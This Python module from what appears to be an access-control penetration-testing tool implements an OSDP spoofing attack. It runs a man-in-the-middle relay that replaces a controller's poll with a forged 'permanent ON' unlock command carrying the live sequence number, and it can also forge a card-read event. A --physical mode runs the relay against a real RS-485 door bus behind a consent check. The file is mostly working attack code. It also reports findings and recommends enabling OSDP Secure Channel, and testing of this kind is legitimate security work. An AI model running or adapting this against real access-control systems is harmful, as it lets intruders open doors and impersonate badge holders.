"""ATK-08 CP/PD spoofing: forged CMD_OUT (unlock) injection + card-event injection.

Door-open is not visible on the OSDP wire, so this proves itself against the single lab PD
lock-state signal (D-05, ``lab/osdp/pd_driver.py``) rather than a decoded frame. Two crafted
frames, both built only via ``codec.encode`` (never hand-assembled bytes):

- ``craft_unlock`` - a ``CMD_OUT`` (0x68) cp->pd frame (reply flag cleared) that commands the
  PD's output to permanent ON (the OSDP spec "unlock" control code).
- ``craft_card_event`` - a ``REPLY_RAW`` (0x50) pd->cp frame (reply flag set) carrying a
  spoofed card-read payload, in the same wire layout the lab PD's own card-read event uses
  (reader_no, format, bit-count, raw card bytes).

``unlock_transform`` drives the unlock onto the live bus through the 04-03 write-capable seam:
it buffers each direction (a single ``recv`` is not guaranteed to be a whole frame, Pitfall 5)
and, the first time it sees a complete cp->pd ``CMD_POLL``, replaces it in flight with
``craft_unlock`` built from that exact frame's address and sequence number - so the injected
command carries a sequence number the live session already expects, with no desync. Every
later frame passes through unchanged (one-shot injection).

``run_spoof(inject, lock_state_probe, ...)`` is the pure verdict (D-02): it requires a locked
baseline (``lock_state_probe()`` is False) before calling ``inject()``, then emits a
``CRITICAL`` Finding only if the probe then observes the transition to unlocked - never on an
already-unlocked baseline (flagged-assumption guard, prohibition).

Import discipline: importable with the standard library plus the stdlib-only Phase 3 modules
(codec/framer/constants/transport). ``typer``, ``report`` and ``safety`` are imported lazily.
"""

from __future__ import annotations

import os
from collections.abc import Callable
from pathlib import Path
from typing import TYPE_CHECKING

from interlock.osdp import codec, constants, framer
from interlock.osdp.codec import OsdpFrame
from interlock.osdp.transport import Direction, TCPTap, Transform
from interlock.plugin import Finding, Severity

if TYPE_CHECKING:
    import typer

# OSDP CMD_OUT control codes (SIA OSDP spec): 0=NOP,1=permanent OFF,2=permanent ON,3=temp
# ON,4=temp OFF,5=cancel timed operation. "Unlock" is a strike/relay driven permanently ON.
_CONTROL_CODE_PERMANENT_ON = 0x02

# Card-read wire layout, matching lab/osdp/pd_driver.py's own _card_read_event() exactly as
# captured on the wire (reader_no=1, format=1/Wiegand, then a little-endian bit-count).
# VERIFIED: tests/osdp/fixtures/cleartext_pd2cp.cap decodes its REPLY_RAW payload to
# 01 01 18 00 55 aa 0f (reader_no=1, format=1, bit_count=24, data=55 aa 0f).
_CARD_READER_NO = 1
_CARD_FORMAT_WIEGAND = 1

# ATK-08 free-text ATT&CK id: Transmitted Data Manipulation / AiTM (T1557). Phase 5 enriches it.
_TECHNIQUE = "T1557"

# Lab defaults: listen in the attacker (inline MITM) position and rewrite toward the PD.
_DEFAULT_LISTEN_PORT = 10000
_DEFAULT_UPSTREAM = ("pd", 10000)
_DEFAULT_PD_ADDRESS = 101
_LAB_PORT = 10000

# Per-read size for the --physical two-segment serial relay.
_READ_SIZE = 4096

# Trigger file the live lab driver watches: the injection only arms once this path exists, so
# a test can observe a genuinely locked baseline before explicitly arming the attack (the
# ``inject`` half of ``run_spoof``'s contract). Created via ``docker compose exec ... touch``.
_TRIGGER_PATH = Path("/tmp/interlock-spoof-fire")

# A zero-arg trigger that performs one injection attempt (lab: blocks on the live MITM;
# --physical: writes one crafted frame to the consented serial segment).
Inject = Callable[[], None]

# A zero-arg oracle reporting whether the lock-state signal is CURRENTLY observed unlocked.
LockStateProbe = Callable[[], bool]


def craft_unlock(address: int, *, sequence: int) -> bytes:
    """Return an encoded cp->pd ``CMD_OUT`` frame commanding the PD's output permanently ON.

    The reply flag is cleared from ``address`` (a command travels CP->PD). ``sequence`` is the
    3-bit OSDP sequence number (``constants.PKT_CONTROL_SQN``) the live session currently
    expects; the CRC trailer is always used. Built only via ``codec.encode`` - never
    hand-assembled bytes - so the frame is byte-correct (LEN, CRC) for any receiver.
    """
    control = constants.PKT_CONTROL_CRC | (sequence & constants.PKT_CONTROL_SQN)
    data = bytes([0x00, _CONTROL_CODE_PERMANENT_ON, 0x00, 0x00])  # output_no, control_code, timer(LE)
    frame = OsdpFrame(
        had_mark=True,
        address=address & ~constants.ADDR_REPLY_FLAG,
        control=control,
        scb=b"",
        code=constants.CMD_OUT,
        data=data,
        use_crc=True,
    )
    return codec.encode(frame)


def craft_card_event(address: int, card_bytes: bytes, *, sequence: int) -> bytes:
    """Return an encoded pd->cp ``REPLY_RAW`` frame spoofing a card-read event.

    The reply flag is set on ``address`` (a reply travels PD->CP). ``card_bytes`` is wrapped in
    the same reader_no/format/bit-count header the lab PD's own card-read event uses, so the
    crafted frame decodes exactly like a genuine one. Built only via ``codec.encode``.
    """
    bit_count = len(card_bytes) * 8
    header = bytes(
        [_CARD_READER_NO, _CARD_FORMAT_WIEGAND, bit_count & 0xFF, (bit_count >> 8) & 0xFF]
    )
    control = constants.PKT_CONTROL_CRC | (sequence & constants.PKT_CONTROL_SQN)
    frame = OsdpFrame(
        had_mark=True,
        address=address | constants.ADDR_REPLY_FLAG,
        control=control,
        scb=b"",
        code=constants.REPLY_RAW,
        data=header + card_bytes,
        use_crc=True,
    )
    return codec.encode(frame)


def unlock_transform(*, armed: Callable[[], bool] = lambda: True) -> Transform:
    """Return a one-shot ``Transform`` that rewrites the first cp->pd ``CMD_POLL`` into an unlock.

    Buffers bytes per direction (Pitfall 5: a single chunk is not guaranteed to be a whole
    frame) and re-runs ``framer.iter_frames`` over the growing buffer, forwarding only newly
    completed frames (mirrors ``downgrade.downgrade_transform``'s buffering discipline). The
    first complete cp->pd ``CMD_POLL`` seen WHILE ``armed()`` is True is replaced, in flight,
    with ``craft_unlock`` built from that exact frame's address and sequence number - so the
    injected command is sequence-valid for the live session. Every other frame, and every
    frame after the one-shot injection, passes through byte-identically.

    ``armed`` defaults to always-true (fires on the very first POLL observed - the real-world
    and ``--physical`` shape, where the attacker wants the unlock as soon as possible). The live
    lab driver passes a controllable predicate (a trigger-file check) so a test can observe a
    genuinely locked baseline before arming the injection.
    """
    buffers: dict[Direction, bytearray] = {
        Direction.cp_to_pd: bytearray(),
        Direction.pd_to_cp: bytearray(),
    }
    forwarded: dict[Direction, int] = {Direction.cp_to_pd: 0, Direction.pd_to_cp: 0}
    injected = False

    def transform(direction: Direction, data: bytes) -> bytes:
        nonlocal injected
        buffer = buffers[direction]
        buffer.extend(data)
        frames = list(framer.iter_frames(bytes(buffer)))
        new_frames = frames[forwarded[direction] :]
        forwarded[direction] = len(frames)

        out = bytearray()
        for raw in new_frames:
            if direction is Direction.cp_to_pd and not injected and armed():
                try:
                    frame = codec.decode(raw)
                except codec.DecodeError:
                    out += raw  # trailer-valid but structurally odd; forward unchanged
                    continue
                if frame.code == constants.CMD_POLL:
                    sequence = frame.control & constants.PKT_CONTROL_SQN
                    out += craft_unlock(frame.address, sequence=sequence)
                    injected = True
                    continue
            out += raw
        return bytes(out)

    return transform


def run_spoof(
    inject: Inject,
    lock_state_probe: LockStateProbe,
    *,
    technique: str = _TECHNIQUE,
) -> list[Finding]:
    """Drive one unlock injection and emit a Finding only on a locked->unlocked transition.

    Requires a locked baseline: if ``lock_state_probe()`` already reports unlocked before
    ``inject()`` runs, the transition cannot be attributed to this attack and ``[]`` is
    returned (flagged-assumption guard, prohibition - never claim an already-unlocked state as
    a spoof success). ``inject`` performs the injection attempt (and, on the lab driver, blocks
    until the live transform's one-shot rewrite has had a chance to land); the Finding is
    emitted only if the probe then confirms the transition.
    """
    if lock_state_probe():
        return []  # inconclusive: already unlocked, not attributable to this inject
    inject()
    if not lock_state_probe():
        return []  # the injection had no observed effect
    return [
        Finding(
            id="ATK-08-spoof-unlock",
            title="OSDP PD unlocked by a forged CMD_OUT injected onto the bus",
            severity=Severity.CRITICAL,
            evidence=(
                "The PD's lock-state signal was LOCKED before the injection and flipped to "
                "UNLOCKED immediately after a forged CMD_OUT (output permanently ON) was "
                "injected cp->pd through the in-path MITM seam, carrying the live session's "
                "own sequence number so it was accepted as a legitimate command."
            ),
            attack_technique=technique,
            remediation=(
                "Enable OSDP Secure Channel with MAC+encryption (SCS_17/18) so an in-path "
                "attacker cannot forge or inject accepted commands; without channel integrity, "
                "any party on the bus can command the PD's outputs directly."
            ),
        )
    ]


def serve_spoof_unlock_lab(target_port: int, upstream: tuple[str, int]) -> None:
    """Serve the inline unlock-spoof rewrite relay against the lab bus (blocking).

    Drives ``unlock_transform`` onto the write-capable ``TCPTap.serve_rewrite`` seam: the CP
    dials the attacker position, the first cp->pd CMD_POLL is rewritten into a forged unlock
    CMD_OUT, and the lab PD lock-state signal confirms the outcome. Blocks serving connections,
    like the other attack modules' lab drivers.
    """
    TCPTap(target_port, upstream).serve_rewrite(unlock_transform())


def _upstream() -> tuple[str, int]:
    """Parse ``ATTACKER_UPSTREAM`` (``host:port``) with a ``pd:10000`` default."""
    raw = os.environ.get("ATTACKER_UPSTREAM", f"pd:{_LAB_PORT}")
    host, _, port = raw.partition(":")
    return host, int(port) if port else _LAB_PORT


def main() -> None:
    """Attacker-container entrypoint: serve the unlock-spoof rewrite relay (lab default).

    Run by the ``docker-compose.spoof.yml`` override as
    ``python -m interlock.osdp.attacks.spoof``. The injection only arms once ``_TRIGGER_PATH``
    exists (``docker compose exec ... touch``), so a live test can confirm the PD stays locked
    beforehand and attribute the transition to an explicit ``inject()`` call.
    """
    upstream = _upstream()
    print(
        f"interlock: spoof (unlock) MITM listening on 0.0.0.0:{_LAB_PORT} "
        f"upstream={upstream[0]}:{upstream[1]}",
        flush=True,
    )
    TCPTap(_LAB_PORT, upstream).serve_rewrite(unlock_transform(armed=_TRIGGER_PATH.exists))


def _serial_unlock_relay(cp_endpoint: object, pd_endpoint: object) -> None:
    """Run the one-shot unlock injection over a two-segment real serial MITM (``--physical``).

    An RS-485 OSDP bus must be split into a CP-side and a PD-side segment for an inline
    rewrite. Both pyserial endpoints are opened (the CP-side only after the SAFE-02 consent
    gate), and ``unlock_transform`` is applied to each direction. Kept dependency-light so the
    module imports with no pyserial at module scope.
    """
    import threading

    transform = unlock_transform()

    def pump(src: object, dst: object, direction: Direction) -> None:
        while True:
            data = bytes(src.read(_READ_SIZE))  # type: ignore[attr-defined]
            if not data:
                continue
            out = transform(direction, data)
            if out:
                dst.write(out)  # type: ignore[attr-defined]

    worker = threading.Thread(
        target=pump, args=(pd_endpoint, cp_endpoint, Direction.pd_to_cp), daemon=True
    )
    worker.start()
    pump(cp_endpoint, pd_endpoint, Direction.cp_to_pd)


def register(app: typer.Typer) -> None:
    """Attach the ``spoof`` subcommand to the ``osdp`` Typer group."""
    import typer

    @app.command("spoof")
    def spoof(
        kind: str = typer.Option(
            "unlock",
            "--kind",
            help="unlock = forge CMD_OUT (default); card-event = forge a REPLY_RAW card read.",
        ),
        port: int = typer.Option(
            _DEFAULT_LISTEN_PORT,
            "--port",
            help="Local TCP port to listen on (attacker inline position, lab default).",
        ),
        upstream_host: str = typer.Option(
            _DEFAULT_UPSTREAM[0],
            "--upstream-host",
            help="Upstream PD host to relay to (lab default).",
        ),
        upstream_port: int = typer.Option(
            _DEFAULT_UPSTREAM[1],
            "--upstream-port",
            help="Upstream PD port to relay to.",
        ),
        address: int = typer.Option(
            _DEFAULT_PD_ADDRESS,
            "--address",
            help="PD address to target (card-event kind only).",
        ),
        physical: bool = typer.Option(
            False,
            "--physical",
            help="Run the spoof over a REAL two-segment serial bus, behind the SAFE-02 "
            "consent gate.",
        ),
        device: str = typer.Option(
            "",
            "--device",
            help="CP-side serial device path for --physical (e.g. /dev/ttyUSB0).",
        ),
        upstream_device: str = typer.Option(
            "",
            "--upstream-device",
            help="PD-side serial device path for --physical (e.g. /dev/ttyUSB1).",
        ),
        target: str = typer.Option(
            "",
            "--target",
            help="Scope identifier you are authorized to assess (required for --physical).",
        ),
    ) -> None:
        """Spoof a forged CMD_OUT unlock (or a card-read event) via an in-path injection."""
        if kind not in ("unlock", "card-event"):
            raise typer.BadParameter("--kind must be 'unlock' or 'card-event'")

        if physical:
            # The ONLY real-port path: SAFE-02 consent gate before any byte is transmitted.
            from interlock.osdp import transport
            from interlock.osdp.attacks import safety

            if kind != "unlock":
                raise typer.BadParameter("--physical currently supports --kind unlock only")
            if not device or not upstream_device or not target:
                raise typer.BadParameter(
                    "--physical requires --device, --upstream-device and --target"
                )
            cp_endpoint = safety.open_physical_endpoint(device, target)
            try:
                pd_endpoint = transport.open_serial_endpoint(upstream_device)
                try:
                    typer.echo(
                        "Running unlock spoof over the consented serial segments "
                        "(Ctrl-C to stop)."
                    )
                    _serial_unlock_relay(cp_endpoint, pd_endpoint)
                finally:
                    pd_endpoint.close()
            finally:
                cp_endpoint.close()
            return

        if kind == "unlock":
            typer.echo(
                f"Running unlock spoof MITM on the lab bus: listening on :{port}, "
                f"relaying to {upstream_host}:{upstream_port} (Ctrl-C to stop)."
            )
            serve_spoof_unlock_lab(port, (upstream_host, upstream_port))
        else:
            typer.echo(
                f"Running card-event spoof MITM on the lab bus: listening on :{port}, "
                f"relaying to {upstream_host}:{upstream_port} (Ctrl-C to stop)."
            )
            TCPTap(port, (upstream_host, upstream_port)).serve_rewrite(
                _card_event_transform(address)
            )


def _card_event_transform(address: int) -> Transform:
    """Return a one-shot ``Transform`` that rewrites the first pd->cp frame into a card event.

    Mirrors ``unlock_transform`` but in the pd->cp direction: the first complete reply it sees
    is replaced with a spoofed ``REPLY_RAW`` card event carrying the lab's own sample card
    bytes, preserving the intercepted frame's sequence number.
    """
    buffers: dict[Direction, bytearray] = {
        Direction.cp_to_pd: bytearray(),
        Direction.pd_to_cp: bytearray(),
    }
    forwarded: dict[Direction, int] = {Direction.cp_to_pd: 0, Direction.pd_to_cp: 0}
    injected = False
    sample_card = bytes([0x55, 0xAA, 0x0F])

    def transform(direction: Direction, data: bytes) -> bytes:
        nonlocal injected
        buffer = buffers[direction]
        buffer.extend(data)
        frames = list(framer.iter_frames(bytes(buffer)))
        new_frames = frames[forwarded[direction] :]
        forwarded[direction] = len(frames)

        out = bytearray()
        for raw in new_frames:
            if direction is Direction.pd_to_cp and not injected:
                try:
                    frame = codec.decode(raw)
                except codec.DecodeError:
                    out += raw
                    continue
                sequence = frame.control & constants.PKT_CONTROL_SQN
                out += craft_card_event(address, sample_card, sequence=sequence)
                injected = True
                continue
            out += raw
        return bytes(out)

    return transform


if __name__ == "__main__":
    main()
